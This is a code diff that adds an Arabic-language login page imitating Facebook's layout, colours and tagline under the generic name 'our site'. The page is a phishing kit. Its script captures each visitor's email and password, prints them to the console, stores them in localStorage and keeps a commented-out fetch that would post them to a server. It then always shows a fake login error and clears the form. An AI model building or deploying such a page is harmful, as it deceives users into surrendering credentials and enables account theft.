@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - موقعنا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .container {
+            display: flex;
+            max-width: 1000px;
+            width: 100%;
+            gap: 60px;
+            align-items: center;
+        }
+        
+        .intro {
+            flex: 1;
+        }
+        
+        .intro h1 {
+            color: #1877f2;
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        
+        .intro p {
+            font-size: 24px;
+            line-height: 1.4;
+        }
+        
+        .login-box {
+            flex: 1;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .login-box input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .error-message {
+            color: #ff4d4f;
+            margin-bottom: 15px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="intro">
+            <h1>موقعنا</h1>
+            <p>يساعدك موقعنا على التواصل مع الأشخاص ومشاركة ما تريد.</p>
+        </div>
+        
+        <div class="login-box">
+            <form id="loginForm">
+                <div id="errorMessage" class="error-message">
+                    خطأ في تسجيل الدخول. يرجى المحاولة مرة أخرى بعد حين.
+                </div>
+                
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="password" placeholder="كلمة السر" required>
+                
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+                
+                <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+                
+                <div class="divider"></div>
+                
+                <button type="button" class="create-account">إنشاء حساب جديد</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // الحصول على قيم الحقول
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // 1. عرض البيانات في Console (لك فقط كمطور)
+            console.log('------ بيانات الدخول المستلمة ------');
+            console.log('البريد الإلكتروني/الهاتف:', email);
+            console.log('كلمة السر:', password);
+            console.log('----------------------------------');
+            
+            // 2. إرسال البيانات إلى الخادم (سجل البيانات هناك)
+            // هذا مثال باستخدام fetch:
+            /*
+            fetch('/log_login_attempt', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('تم تسجيل محاولة الدخول:', data);
+            })
+            .catch(error => {
+                console.error('حدث خطأ:', error);
+            });
+            */
+            
+            // 3. بدلاً من ذلك، يمكنك استخدام localStorage مؤقتًا
+            // (لأغراض الاختبار فقط، غير آمن للإنتاج)
+            const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts') || '[]');
+            loginAttempts.push({
+                email: email,
+                password: password,
+                time: new Date().toLocaleString()
+            });
+            localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
+            
+            // عرض رسالة الخطأ للمستخدم
+            document.getElementById('errorMessage').style.display = 'block';
+            
+            // مسح الحقول بعد الإرسال (اختياري)
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+        });
+    </script>
+</body>
+</html>
